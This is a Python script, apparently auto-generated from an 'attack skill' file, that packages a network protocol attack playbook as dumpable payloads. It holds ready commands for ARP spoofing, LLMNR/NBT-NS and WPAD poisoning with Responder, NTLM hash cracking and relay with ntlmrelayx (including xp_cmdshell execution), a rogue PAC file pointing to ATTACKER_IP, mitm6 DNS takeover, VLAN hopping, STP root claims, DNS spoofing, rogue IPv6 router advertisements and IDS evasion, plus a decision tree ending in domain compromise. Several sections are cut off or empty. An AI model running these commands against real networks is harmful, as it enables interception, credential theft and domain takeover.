#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/network-protocol-attacks

Skill: SKILL: Network Protocol Attacks — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-network-protocol-attacks.py --help
      python hack-skills-network-protocol-attacks.py --list
      python hack-skills-network-protocol-attacks.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/network-protocol-attacks'
TITLE = 'SKILL: Network Protocol Attacks — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: network-protocol-attacks", "description: >-", "Network protocol attack playbook. Use when exploiting layer 2/3 protocols including ARP spoofing, LLMNR/NBT-NS/mDNS poisoning, WPAD abuse, DHCPv6 attacks, VLAN hopping, STP manipulation, DNS spoofing, IPv6 attacks, and IDS/IPS evasion."],
    'skill-network-protocol-attacks-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) after establishing MitM position for traffic redirection", "- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for relaying captured NTLM hashes from poisoning attacks", "- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting services discovered during network attacks", "- [traffic-analysis-pcap](../traffic-analysis-pcap/SKILL.md) for analyzing captured traffic from MitM"],
    'advanced-reference': ["Also load [NAME_RESOLUTION_POISONING.md](./NAME_RESOLUTION_POISONING.md) when you need:", "- Detailed Responder/mitm6 configuration and workflows", "- NTLM relay target selection and chaining", "- Credential format analysis and cracking priorities"],
    '1-arp-spoofing': [],
    'gratuitous-arp-mitm-positioning': ["```bash"],
    'arpspoof-dsniff-suite': ["echo 1 > /proc/sys/net/ipv4/ip_forward", "arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &", "arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &"],
    'ettercap-arp-poisoning-with-sniffing': ["ettercap -T -q -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//"],
    'bettercap-modern-framework': ["bettercap -iface eth0"],
    'selective-targeting': ["```bash"],
    'bettercap-target-specific-hosts-avoid-detection': [],
    'detection-indicators': ["- Duplicate MAC addresses in ARP table", "- Gratuitous ARP storms from non-gateway IPs", "- Tools: `arpwatch`, static ARP entries, 802.1X port authentication"],
    '2-llmnr-nbt-ns-mdns-poisoning': [],
    'responder-credential-capture': ["```bash"],
    'basic-poisoning-llmnr-nbt-ns-mdns': ["responder -I eth0 -dwPv"],
    'key-flags': [],
    'd-enable-answers-for-dhcp-broadcast-requests-fingerprinting': [],
    'w-start-wpad-rogue-proxy': [],
    'p-force-ntlm-auth-for-wpad': [],
    'v-verbose': [],
    'analyze-mode-only-passive-no-poisoning': ["responder -I eth0 -A"],
    'captured-hash-formats': ["```bash"],
    'crack-captured-hashes': ["hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule", "john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt"],
    'relay-instead-of-crack': ["```bash"],
    'ntlmrelayx-relay-captured-ntlm-to-other-services': ["ntlmrelayx.py -tf targets.txt -smb2support", "ntlmrelayx.py -t ldaps://DC01 --delegate-access    # RBCD attack", "ntlmrelayx.py -t mssql://DB01 -q \"exec xp_cmdshell 'whoami'\""],
    '3-wpad-abuse': ["```bash"],
    'responder-with-wpad-proxy': ["responder -I eth0 -wPv"],
    'wpad-flow': [],
    '1-client-queries-dhcp-for-wpad-dns-for-wpad-domain-com-llmnr-nbt-ns': [],
    '2-responder-answers-with-rogue-wpad-dat': [],
    '3-browser-uses-attacker-s-proxy-forced-ntlm-auth-credential-capture': [],
    'manual-wpad-pac-file': ["```javascript", "// Rogue wpad.dat content", "function FindProxyForURL(url, host) {", "return \"PROXY ATTACKER_IP:3128; DIRECT\";"],
    '4-dhcpv6-attack-mitm6': ["Even on IPv4-only networks, Windows clients send DHCPv6 solicitations by default.", "```bash"],
    'mitm6-dns-takeover-ntlm-relay': ["mitm6 -d domain.com"],
    'in-parallel-relay-captured-ntlm-to-ldap-s-for-delegation': ["ntlmrelayx.py -6 -t ldaps://DC01 -wh fakewpad.domain.com -l loot --delegate-access"],
    'attack-chain': [],
    '1-mitm6-answers-dhcpv6-sets-attacker-as-ipv6-dns': [],
    '2-victim-dns-queries-go-to-attacker-wpad-redirect': [],
    '3-forced-ntlm-auth-relay-to-ldap-create-machine-account-or-rbcd': [],
    'key-conditions': ["- SMB signing disabled on targets (for SMB relay)", "- LDAP signing not enforced on DC (for LDAP relay)", "- Domain Computers quota > 0 (for machine account creation, default: 10)"],
    '5-vlan-hopping': [],
    'switch-spoofing-dtp': ["```bash"],
    'yersinia-dtp-attack-to-negotiate-trunk': ["yersinia dtp -attack 1 -interface eth0"],
    'frogger-sh-automated-vlan-hopping-via-dtp': ["./frogger.sh"],
    'sends-dtp-frames-switch-enables-trunking-access-all-vlans': [],
    'after-trunk-established': ["modprobe 8021q", "vconfig add eth0 TARGET_VLAN", "ifconfig eth0.TARGET_VLAN 10.10.10.1 netmask 255.255.255.0 up"],
    'double-tagging-802-1q': ["```bash"],
    'craft-double-tagged-frame-outer-native-vlan-inner-target-vlan': [],
    'scapy': ["from scapy.all import *", "pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst=\"TARGET\")/ICMP()", "sendp(pkt, iface=\"eth0\")"],
    'limitation-one-way-only-responses-go-to-real-gateway': [],
    'effective-for-blind-attacks-e-g-targeting-a-server': [],
    'mitigation': ["- Disable DTP: `switchport nonegotiate`", "- Set native VLAN to unused: `switchport trunk native vlan 999`", "- Prune VLANs: only allow needed VLANs on trunk ports"],
    '6-stp-manipulation': [],
    'root-bridge-claim': ["```bash"],
    'yersinia-claim-root-bridge-with-lowest-priority': ["yersinia stp -attack 4 -interface eth0"],
    'send-bpdus-with-priority-0-become-root-bridge': [],
    'all-traffic-flows-through-attacker-mitm': [],
    'topology-change-attack': ["```bash"],
    'send-tc-topology-change-bpdus-force-mac-table-flush': ["yersinia stp -attack 1 -interface eth0"],
    'switches-flood-all-ports-temporarily-sniff-traffic': [],
    'mitigation': ["- BPDU Guard on access ports", "- Root Guard on designated ports", "- `spanning-tree portfast bpduguard enable`"],
    '7-dns-spoofing': [],
    'dns-cache-poisoning': ["```bash"],
    'bettercap-dns-spoofing': ["bettercap -iface eth0"],
    'ettercap-dns-spoofing-via-etter-dns-config': ["echo \"target.com A ATTACKER_IP\" >> /etc/ettercap/etter.dns", "ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /VICTIM// /GATEWAY//"],
    'kaminsky-attack-variant': ["Flood recursive resolver with forged responses for random subdomains, each including a malicious authority section pointing the NS record to attacker-controlled server."],
    '8-ipv6-attacks': [],
    'router-advertisement-spoofing': ["```bash"],
    'send-rogue-ra-victim-configures-attacker-as-default-gateway': ["atk6-fake_router6 eth0 ATTACKER_IPV6_PREFIX/64"],
    'thc-ipv6-suite-for-comprehensive-ipv6-attacks': ["atk6-parasite6 eth0     # ICMPv6 neighbor spoofing", "atk6-redir6 eth0 ...    # Traffic redirection via ICMPv6 redirect"],
    'slaac-abuse': ["```bash"],
    'advertise-rogue-prefix-victim-auto-configures-ipv6-address': [],
    'combined-with-rogue-dns-ra-option-full-mitm-over-ipv6': [],
    'windows-prioritizes-ipv6-over-ipv4-by-default': [],
    '9-ids-ips-evasion': ["```bash"],
    'fragroute-fragment-and-reorder-packets': ["echo \"ip_frag 8\" > /tmp/frag.conf", "echo \"order random\" >> /tmp/frag.conf", "fragroute -f /tmp/frag.conf TARGET_IP"],
    'nmap-evasion-combinations': ["nmap -sS -f --mtu 24 --data-length 50 -D RND:5 -T2 TARGET"],
    '10-decision-tree': ["Network access obtained \u2014 want to escalate via network attacks", "\u251c\u2500\u2500 On same broadcast domain as targets?", "\u2502   \u251c\u2500\u2500 YES \u2192 ARP spoof for MitM (\u00a71)", "\u2502   \u2502   \u2514\u2500\u2500 Capture plaintext creds or redirect traffic", "\u2502   \u2514\u2500\u2500 NO \u2192 need VLAN hopping first (\u00a75)", "\u2502       \u251c\u2500\u2500 DTP enabled? \u2192 switch spoofing", "\u2502       \u2514\u2500\u2500 Know native VLAN? \u2192 double tagging", "\u251c\u2500\u2500 Windows environment?", "\u2502   \u251c\u2500\u2500 LLMNR/NBT-NS enabled? (default YES)", "\u2502   \u2502   \u2514\u2500\u2500 Run Responder (\u00a72) \u2192 capture NetNTLM hashes", "\u2502   \u2502       \u251c\u2500\u2500 NTLMv1? \u2192 crack fast or relay", "\u2502   \u2502       \u2514\u2500\u2500 NTLMv2? \u2192 relay (\u00a72) or crack with rules", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 WPAD configured or auto-detect? \u2192 WPAD abuse (\u00a73)", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 IPv6 not hardened? (default) \u2192 mitm6 + ntlmrelayx (\u00a74)", "\u2502       \u2514\u2500\u2500 LDAP relay \u2192 RBCD \u2192 domain compromise", "\u251c\u2500\u2500 Need DNS control?", "\u2502   \u251c\u2500\u2500 MitM already established? \u2192 DNS spoofing (\u00a77)", "\u2502   \u2514\u2500\u2500 DHCPv6 available? \u2192 mitm6 for DNS takeover (\u00a74)", "\u251c\u2500\u2500 Managed switches with weak config?", "\u2502   \u251c\u2500\u2500 BPDU Guard off? \u2192 STP root bridge claim (\u00a76)", "\u2502   \u2514\u2500\u2500 DTP enabled? \u2192 VLAN hopping (\u00a75)", "\u251c\u2500\u2500 IPv6 attack surface?", "\u2502   \u2514\u2500\u2500 RA spoofing / SLAAC abuse (\u00a78) \u2192 MitM over IPv6", "\u2514\u2500\u2500 IDS/IPS in path?", "\u2514\u2500\u2500 Apply evasion techniques (\u00a79) \u2014 fragmentation, timing, encoding"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()